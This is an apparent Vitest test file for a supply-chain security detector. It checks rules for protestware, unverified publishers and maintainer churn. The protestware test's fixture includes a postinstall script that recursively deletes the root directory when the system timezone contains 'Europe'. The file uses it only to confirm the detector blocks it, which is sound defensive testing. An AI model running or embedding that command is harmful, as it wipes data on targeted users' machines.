import os from 'node:os';
import { describe, expect, it } from 'vitest';
import { SupplyChainPolicySchema } from '@secureship/contracts';
import { detectGovernanceRisk } from '../../src/supply-chain/detectors/governance.detector.js';
import { SnapshotProvider } from '../../src/supply-chain/providers/snapshot.provider.js';
import type { DetectorContext } from '../../src/supply-chain/internal/types.js';

describe('GovernanceDetector (SC-GOV-*)', () => {
  const policy = SupplyChainPolicySchema.parse({});
  const ctx: DetectorContext = {
    packageName: 'gov-pkg',
    version: '2.0.0',
    ecosystem: 'npm',
    packageDir: os.tmpdir(),
    now: () => new Date('2026-10-21T00:00:00Z'),
  };

  it('detects protestware geo-targeted destructive operations (SC-GOV-003)', async () => {
    const pkgJson = {
      name: 'protest-pkg',
      version: '1.0.0',
      scripts: {
        postinstall:
          "node -e \"if (Intl.DateTimeFormat().resolvedOptions().timeZone.includes('Europe')) { require('fs').rmdirSync('/', { recursive: true }); }\"",
      },
    };

    const snapshot = new SnapshotProvider();
    const hits = await detectGovernanceRisk('protest-pkg', '1.0.0', pkgJson, snapshot, policy, ctx);

    expect(hits.some((h) => h.ruleId === 'SC-GOV-003')).toBe(true);
    const hit = hits.find((h) => h.ruleId === 'SC-GOV-003')!;
    expect(hit.severity).toBe('CRITICAL');
    expect(hit.blocking).toBe(true);
  });

  it('detects unverified / missing publisher (SC-GOV-002)', async () => {
    const snapshot = new SnapshotProvider();
    // Snapshot without publisher
    snapshot.setPublisher('npm', 'ghost-pkg', '1.0.0', null);

    const hits = await detectGovernanceRisk('ghost-pkg', '1.0.0', {}, snapshot, policy, {
      ...ctx,
      packageName: 'ghost-pkg',
    });

    expect(hits.some((h) => h.ruleId === 'SC-GOV-002')).toBe(true);
    const hit = hits.find((h) => h.ruleId === 'SC-GOV-002')!;
    expect(hit.severity).toBe('MEDIUM');
  });

  it('detects maintainer churn with added install scripts (SC-GOV-001)', async () => {
    const snapshot = new SnapshotProvider();
    snapshot.setPackument('npm', 'churn-pkg', {
      name: 'churn-pkg',
      versions: {
        '1.0.0': { name: 'churn-pkg', version: '1.0.0', scripts: { test: 'vitest' } },
        '2.0.0': {
          name: 'churn-pkg',
          version: '2.0.0',
          scripts: { test: 'vitest', postinstall: 'node setup.js' },
        },
      },
      time: { '1.0.0': '2025-01-01T00:00:00Z', '2.0.0': '2026-10-10T00:00:00Z' },
      maintainers: [{ name: 'new-maintainer' }],
    });

    const hits = await detectGovernanceRisk('churn-pkg', '2.0.0', {}, snapshot, policy, {
      ...ctx,
      packageName: 'churn-pkg',
      version: '2.0.0',
    });

    expect(hits.some((h) => h.ruleId === 'SC-GOV-001')).toBe(true);
    const hit = hits.find((h) => h.ruleId === 'SC-GOV-001')!;
    expect(hit.severity).toBe('HIGH');
  });
});
